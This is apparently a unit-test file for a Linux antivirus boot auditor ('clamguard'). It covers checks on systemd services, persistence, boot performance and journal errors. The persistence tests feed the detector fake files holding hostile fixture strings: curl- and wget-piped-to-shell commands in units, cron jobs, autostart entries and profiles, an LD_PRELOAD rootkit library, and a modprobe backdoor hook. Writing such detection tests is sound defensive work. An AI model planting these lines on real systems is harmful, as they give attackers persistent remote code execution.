# ---------------------------------------------------------------------------
# Services
# ---------------------------------------------------------------------------


class TestServices(unittest.TestCase):
    def test_no_failed_units_passes(self) -> None:
        probe = FakeProbe(commands={
            ("systemctl", "list-units", "--failed", "--no-legend", "--plain",
             "--no-pager"): ""})
        self.assertIs(only(run("services.failed", probe)).severity, Severity.PASS)

    def test_each_failed_unit_is_its_own_finding(self) -> None:
        probe = FakeProbe(commands={
            ("systemctl", "list-units", "--failed", "--no-legend", "--plain",
             "--no-pager"): "a.service loaded failed failed A\n"
                            "b.service loaded failed failed B\n"})
        found = ids(run("services.failed", probe))
        self.assertIn("services.failed.a-service", found)
        self.assertIn("services.failed.b-service", found)

    def test_a_failed_security_service_outranks_an_ordinary_one(self) -> None:
        security = FakeProbe(commands={
            ("systemctl", "list-units", "--failed", "--no-legend", "--plain",
             "--no-pager"): "clamav-daemon.service loaded failed failed C\n"})
        ordinary = FakeProbe(commands={
            ("systemctl", "list-units", "--failed", "--no-legend", "--plain",
             "--no-pager"): "printer.service loaded failed failed P\n"})
        self.assertGreater(only(run("services.failed", security)).severity,
                           only(run("services.failed", ordinary)).severity)

    def test_a_degraded_system_is_reported(self) -> None:
        probe = FakeProbe(commands={("systemctl", "is-system-running"): "degraded"})
        self.assertEqual(only(run("services.state", probe)).id,
                         "services.state.degraded")

    def test_a_running_system_passes(self) -> None:
        probe = FakeProbe(commands={("systemctl", "is-system-running"): "running"})
        self.assertIs(only(run("services.state", probe)).severity, Severity.PASS)

    def test_units_scoring_above_the_threshold_are_reported(self) -> None:
        probe = FakeProbe(commands={
            ("systemd-analyze", "security", "--no-pager"):
                "UNIT EXPOSURE PREDICATE HAPPY\n"
                "sshd.service 9.6 UNSAFE :-{\n"
                "dbus.service 3.1 OK :-)\n"})
        finding = only(run("services.exposure", probe))
        self.assertEqual(finding.id, "services.exposure.unsafe")
        self.assertIn("sshd.service", finding.summary)

    def test_the_exposure_threshold_comes_from_the_preset(self) -> None:
        probe = FakeProbe(commands={
            ("systemd-analyze", "security", "--no-pager"):
                "UNIT EXPOSURE PREDICATE HAPPY\nx.service 8.5 EXPOSED :-(\n"})
        self.assertIs(only(run("services.exposure", probe, "relaxed")).severity,
                      Severity.PASS)
        self.assertNotEqual(only(run("services.exposure", probe, "strict")).id,
                            "services.exposure.contained")

    def test_an_empty_masked_list_is_a_pass_not_a_skip(self) -> None:
        """systemctl exits non-zero when a --state filter matches nothing."""
        probe = FakeProbe(commands={
            ("systemctl", "list-unit-files", "--state=masked", "--no-legend",
             "--plain", "--no-pager"): ""})
        outcome = run("services.masked", probe)
        self.assertEqual(outcome.skipped, "")
        self.assertIs(only(outcome).severity, Severity.PASS)

    def test_a_masked_security_service_is_called_out_by_name(self) -> None:
        probe = FakeProbe(commands={
            ("systemctl", "list-unit-files", "--state=masked", "--no-legend",
             "--plain", "--no-pager"): "auditd.service masked\n"})
        finding = only(run("services.masked", probe))
        self.assertEqual(finding.id, "services.masked.security")
        self.assertIn("auditd", finding.summary)

    def test_a_local_copy_of_a_packaged_unit_is_reported(self) -> None:
        probe = FakeProbe(
            directories={"/etc/systemd/system": ["sshd.service"]},
            files={"/etc/systemd/system/sshd.service": "[Service]\nExecStart=/x",
                   "/usr/lib/systemd/system/sshd.service": "[Service]\nExecStart=/y"},
        )
        finding = only(run("services.overrides", probe))
        self.assertEqual(finding.id, "services.overrides.shadowed")

    def test_drop_ins_are_not_treated_as_overrides(self) -> None:
        probe = FakeProbe(
            directories={"/etc/systemd/system": ["sshd.service.d"],
                         "/etc/systemd/system/sshd.service.d": ["override.conf"]},
            files={"/etc/systemd/system/sshd.service.d/override.conf": "[Service]"},
        )
        self.assertIs(only(run("services.overrides", probe)).severity, Severity.PASS)


# ---------------------------------------------------------------------------
# Persistence — the part that matters most in an antivirus
# ---------------------------------------------------------------------------


class TestPersistence(unittest.TestCase):
    def test_an_absent_ld_preload_is_worth_stating(self) -> None:
        finding = only(run("persistence.ld-preload", FakeProbe()))
        self.assertIs(finding.severity, Severity.PASS)
        self.assertIn("rootkit", finding.summary)

    def test_an_ld_preload_file_is_serious(self) -> None:
        probe = FakeProbe(files={"/etc/ld.so.preload": "/usr/lib/libhide.so\n"})
        finding = only(run("persistence.ld-preload", probe))
        self.assertGreaterEqual(finding.severity, Severity.HIGH)
        self.assertIn("libhide.so", finding.summary)

    def test_ld_preload_in_the_environment_file_counts_too(self) -> None:
        probe = FakeProbe(files={"/etc/environment": "LD_PRELOAD=/tmp/x.so\n"})
        self.assertGreaterEqual(only(run("persistence.ld-preload", probe)).severity,
                                Severity.HIGH)

    def test_a_unit_that_downloads_and_runs_is_serious(self) -> None:
        probe = FakeProbe(
            commands={("systemctl", "list-unit-files", "--state=enabled",
                       "--no-legend", "--plain", "--no-pager"): "evil.service enabled\n"},
            files={"/etc/systemd/system/evil.service":
                   "[Service]\nExecStart=/bin/sh -c 'curl http://x.example/p | sh'\n"},
        )
        findings = [f for f in run("persistence.units", probe).findings
                    if "evil" in f.id]
        self.assertTrue(findings)
        self.assertGreaterEqual(findings[0].severity, Severity.HIGH)

    def test_a_unit_running_out_of_tmp_is_serious(self) -> None:
        probe = FakeProbe(
            commands={("systemctl", "list-unit-files", "--state=enabled",
                       "--no-legend", "--plain", "--no-pager"): "x.service enabled\n"},
            files={"/etc/systemd/system/x.service":
                   "[Service]\nExecStart=/tmp/payload\n"},
        )
        findings = [f for f in run("persistence.units", probe).findings
                    if f.id.endswith("x-service")]
        self.assertGreaterEqual(findings[0].severity, Severity.HIGH)

    def test_an_ordinary_packaged_unit_is_not_flagged(self) -> None:
        probe = FakeProbe(
            commands={("systemctl", "list-unit-files", "--state=enabled",
                       "--no-legend", "--plain", "--no-pager"): "sshd.service enabled\n"},
            files={"/usr/lib/systemd/system/sshd.service":
                   "[Service]\nExecStart=/usr/bin/sshd -D\n"},
        )
        self.assertIs(only(run("persistence.units", probe)).severity, Severity.PASS)

    def test_a_packaged_unit_with_a_relative_exec_start_is_not_flagged(self) -> None:
        """seatd.service ships `ExecStart=seatd -g seat`. That is upstream's call."""
        probe = FakeProbe(
            commands={("systemctl", "list-unit-files", "--state=enabled",
                       "--no-legend", "--plain", "--no-pager"): "seatd.service enabled\n"},
            files={"/usr/lib/systemd/system/seatd.service":
                   "[Service]\nExecStart=seatd -g seat\n"},
        )
        self.assertIs(only(run("persistence.units", probe)).severity, Severity.PASS)

    def test_an_inline_shell_in_a_packaged_unit_is_listed_but_not_shouted_about(self) -> None:
        probe = FakeProbe(
            commands={("systemctl", "list-unit-files", "--state=enabled",
                       "--no-legend", "--plain", "--no-pager"): "wait.service enabled\n"},
            files={"/usr/lib/systemd/system/wait.service":
                   "[Service]\nExecStart=/bin/bash -c \"while true; do sleep 1; done\"\n"},
        )
        finding = only(run("persistence.units", probe))
        self.assertLessEqual(finding.severity, Severity.LOW)

    def test_an_autostart_entry_with_a_bare_command_is_normal(self) -> None:
        """KDE ships dozens of `Exec=nm-applet`. Flagging them buries everything."""
        probe = FakeProbe(
            directories={"/etc/xdg/autostart": ["nm-applet.desktop"]},
            files={"/etc/xdg/autostart/nm-applet.desktop":
                   "[Desktop Entry]\nExec=nm-applet\n"},
        )
        self.assertIs(only(run("persistence.autostart", probe)).severity, Severity.PASS)

    def test_an_autostart_entry_fetching_a_payload_is_flagged(self) -> None:
        probe = FakeProbe(
            directories={"/etc/xdg/autostart": ["update.desktop"]},
            files={"/etc/xdg/autostart/update.desktop":
                   "[Desktop Entry]\nExec=sh -c 'wget -qO- http://x | bash'\n"},
        )
        findings = [f for f in run("persistence.autostart", probe).findings
                    if "update" in f.id]
        self.assertGreaterEqual(findings[0].severity, Severity.HIGH)

    def test_a_disabled_autostart_entry_is_not_counted_as_running(self) -> None:
        probe = FakeProbe(
            directories={"/etc/xdg/autostart": ["off.desktop"]},
            files={"/etc/xdg/autostart/off.desktop":
                   "[Desktop Entry]\nHidden=true\nExec=/tmp/x\n"},
        )
        self.assertIs(only(run("persistence.autostart", probe)).severity, Severity.PASS)

    def test_a_cron_job_piping_a_download_into_a_shell_is_serious(self) -> None:
        probe = FakeProbe(
            directories={"/etc/cron.d": ["update"]},
            files={"/etc/cron.d/update":
                   "*/5 * * * * root curl -s http://x.example/p | sh\n"},
        )
        findings = [f for f in run("persistence.scheduled", probe).findings
                    if f.severity.is_problem]
        self.assertTrue(findings)
        self.assertGreaterEqual(findings[0].severity, Severity.HIGH)

    def test_an_ordinary_cron_entry_is_not_flagged(self) -> None:
        probe = FakeProbe(
            directories={"/etc/cron.d": ["0hourly"]},
            files={"/etc/cron.d/0hourly":
                   "SHELL=/bin/bash\n"
                   "01 * * * * root run-parts /etc/cron.hourly\n"},
        )
        self.assertIs(only(run("persistence.scheduled", probe)).severity, Severity.PASS)

    def test_a_shell_profile_that_fetches_and_runs_is_flagged(self) -> None:
        probe = FakeProbe(
            directories={"/etc/profile.d": ["update.sh"]},
            files={"/etc/profile.d/update.sh":
                   "# harmless comment\ncurl -s http://x.example/p | bash\n"},
        )
        findings = [f for f in run("persistence.shell-profiles", probe).findings
                    if f.severity.is_problem]
        self.assertTrue(findings)

    def test_a_modprobe_install_hook_that_runs_a_payload_is_serious(self) -> None:
        probe = FakeProbe(
            directories={"/etc/modprobe.d": ["evil.conf"]},
            files={"/etc/modprobe.d/evil.conf": "install usbcore /tmp/backdoor\n"},
        )
        findings = [f for f in run("persistence.kernel-hooks", probe).findings
                    if "modprobe" in f.id]
        self.assertGreaterEqual(findings[0].severity, Severity.HIGH)

    def test_a_blacklist_install_line_is_ignored(self) -> None:
        probe = FakeProbe(
            directories={"/etc/modprobe.d": ["blacklist.conf"]},
            files={"/etc/modprobe.d/blacklist.conf": "install pcspkr /bin/true\n"},
        )
        self.assertIs(only(run("persistence.kernel-hooks", probe)).severity,
                      Severity.PASS)

    def test_the_documented_modprobe_reentry_idiom_is_not_a_finding(self) -> None:
        probe = FakeProbe(
            directories={"/etc/modprobe.d": ["mlx4.conf"]},
            files={"/etc/modprobe.d/mlx4.conf":
                   "install mlx4_core /usr/bin/modprobe --ignore-install mlx4_core "
                   "$CMDLINE_OPTS && /usr/bin/modprobe mlx4_en\n"},
        )
        problems = [f for f in run("persistence.kernel-hooks", probe).findings
                    if f.severity.is_problem]
        self.assertEqual(problems, [])

    def test_a_world_writable_path_directory_is_critical(self) -> None:
        probe = FakeProbe(modes={"/usr/local/bin": 0o040777, "/usr/bin": 0o040755})
        finding = only(run("persistence.path", probe))
        self.assertIs(finding.severity, Severity.CRITICAL)

    def test_a_sticky_world_writable_path_directory_is_not_flagged(self) -> None:
        probe = FakeProbe(modes={"/usr/local/bin": 0o041777})
        self.assertIs(only(run("persistence.path", probe)).severity, Severity.PASS)

    def test_path_directories_are_checked_through_their_symlinks(self) -> None:
        """/bin is a symlink to /usr/bin on merged-/usr systems."""
        probe = FakeProbe(modes={"/usr/bin": 0o040755, "/bin": 0o040755})
        self.assertIs(only(run("persistence.path", probe)).severity, Severity.PASS)


# ---------------------------------------------------------------------------
# Performance
# ---------------------------------------------------------------------------


class TestPerformance(unittest.TestCase):
    TIME = ("Startup finished in 24.311s (firmware) + 7.021s (loader) + "
            "4.076s (kernel) + 1min 31.963s (initrd) + 33.653s (userspace) = "
            "2min 41.027s\n")

    def test_durations_are_parsed_out_of_systemd_text(self) -> None:
        from clamguard.core.boot.checks.performance import parse_duration

        self.assertAlmostEqual(parse_duration("24.311s"), 24.311, places=3)
        self.assertAlmostEqual(parse_duration("1min 31.963s"), 91.963, places=3)
        self.assertAlmostEqual(parse_duration("845ms"), 0.845, places=3)
        self.assertAlmostEqual(parse_duration("1h 2min 3s"), 3723.0, places=3)

    def test_unparseable_text_is_zero_not_an_exception(self) -> None:
        from clamguard.core.boot.checks.performance import parse_duration

        self.assertEqual(parse_duration("ages"), 0.0)

    def test_the_phase_breakdown_is_read_from_systemd_analyze_time(self) -> None:
        probe = FakeProbe(commands={("systemd-analyze", "time"): self.TIME})
        finding = only(run("performance.total", probe))
        self.assertEqual(finding.value, "2m 41s")
        self.assertIn("initrd", finding.summary)

    def test_a_quick_boot_passes(self) -> None:
        probe = FakeProbe(commands={
            ("systemd-analyze", "time"):
                "Startup finished in 2.0s (kernel) + 6.0s (userspace) = 8.0s\n"})
        self.assertIs(only(run("performance.total", probe)).severity, Severity.PASS)

    def test_the_boot_time_budget_comes_from_the_preset(self) -> None:
        probe = FakeProbe(commands={
            ("systemd-analyze", "time"):
                "Startup finished in 10.0s (kernel) + 50.0s (userspace) = 60.0s\n"})
        self.assertIs(only(run("performance.total", probe, "relaxed")).severity,
                      Severity.PASS)
        self.assertNotEqual(only(run("performance.total", probe, "paranoid")).id,
                            "performance.total.quick")

    def test_udev_aliases_are_folded_into_one_row(self) -> None:
        from clamguard.core.boot.checks.performance import collapse_device_aliases

        rows = [
            (r"dev-disk-by\x2dpath-pci\x2d0000:0f:00.0\x2dpart1.device", 124.9),
            ("dev-sda1.device", 124.9),
            (r"dev-disk-by\x2duuid-669c.device", 124.9),
            ("optimus-manager.service", 2.0),
        ]
        collapsed, aliases = collapse_device_aliases(rows)
        self.assertEqual(len(collapsed), 2)
        self.assertEqual(collapsed[0][0], "dev-sda1.device")
        self.assertEqual(aliases["dev-sda1.device"], 2)

    def test_folding_keeps_the_device_suffix_so_checks_still_match(self) -> None:
        from clamguard.core.boot.checks.performance import collapse_device_aliases

        collapsed, _aliases = collapse_device_aliases([("dev-sda1.device", 90.0),
                                                       ("dev-sdb1.device", 90.0)])
        self.assertTrue(collapsed[0][0].endswith(".device"))

    def test_escaped_unit_names_are_decoded_for_display(self) -> None:
        from clamguard.core.boot.checks.performance import unescape_unit

        self.assertEqual(unescape_unit(r"dev-disk-by\x2duuid-abc.device"),
                         "dev-disk-by-uuid-abc.device")

    def test_a_device_that_held_the_boot_up_names_fstab_as_the_cause(self) -> None:
        probe = FakeProbe(
            commands={("systemd-analyze", "time"): self.TIME,
                      ("systemd-analyze", "blame", "--no-pager"):
                          " 2min 4.915s dev-sda1.device\n    900ms x.service\n",
                      ("systemd-analyze", "critical-chain", "--no-pager"): ""},
            files={"/etc/fstab": "UUID=abc /mnt/thing ext4 defaults 0 2\n"},
        )
        finding = only(run("performance.devices", probe))
        self.assertEqual(finding.id, "performance.devices.timeout")
        self.assertIn("nofail", finding.impact)

    def test_slow_services_and_slow_devices_are_separate_findings(self) -> None:
        probe = FakeProbe(commands={
            ("systemd-analyze", "time"): self.TIME,
            ("systemd-analyze", "blame", "--no-pager"):
                " 2min 4.915s dev-sda1.device\n 20.000s slow.service\n",
            ("systemd-analyze", "critical-chain", "--no-pager"): ""})
        self.assertEqual(only(run("performance.devices", probe)).id,
                         "performance.devices.timeout")
        self.assertEqual(only(run("performance.units", probe)).id,
                         "performance.units.slow")


# ---------------------------------------------------------------------------
# Integrity
# ---------------------------------------------------------------------------


class TestIntegrity(unittest.TestCase):
    def test_a_quiet_journal_passes(self) -> None:
        probe = FakeProbe(commands={
            ("journalctl", "-b", "-p", "3", "--no-pager", "-o", "short-iso",
             "-n", "1000"): "2026-09-21T10:00:00 host kernel: one error\n"})
        self.assertIs(only(run("integrity.journal", probe)).severity, Severity.PASS)

    def test_a_flood_of_errors_is_reported_with_the_worst_repeat(self) -> None:
        lines = "\n".join(
            f"2026-09-21T10:00:{n % 60:02d} host app[{n}]: the same problem 0x{n:x}"
            for n in range(200))
        probe = FakeProbe(commands={
            ("journalctl", "-b", "-p", "3", "--no-pager", "-o", "short-iso",
             "-n", "1000"): lines})
        finding = only(run("integrity.journal", probe))
        self.assertEqual(finding.id, "integrity.journal.noisy")
        self.assertIn("the same problem", finding.summary)

    def test_repeated_messages_are_grouped_by_shape_not_by_pid(self) -> None:
        from clamguard.core.boot.checks.integrity import _normalise

        first = _normalise("2026-09-21T10:00:00 host app[1234]: failed at 0xdeadbeef")
        second = _normalise("2026-09-21T11:11:11 host app[9999]: failed at 0xcafe")
        self.assertEqual(first, second)

    def test_no_baseline_is_reported_as_a_gap_not_a_pass(self) -> None:
        import tempfile
        from pathlib import Path
        from unittest import mock

        from clamguard.core.boot import baseline as baseline_module

        empty = Path(tempfile.mkdtemp()) / "nothing.json"
        with mock.patch.object(baseline_module, "default_path", lambda: empty):
            finding = only(run("integrity.baseline", FakeProbe()))
        self.assertEqual(finding.id, "integrity.baseline.none")
        self.assertIs(finding.severity, Severity.INFO)


if __name__ == "__main__":
    unittest.main()
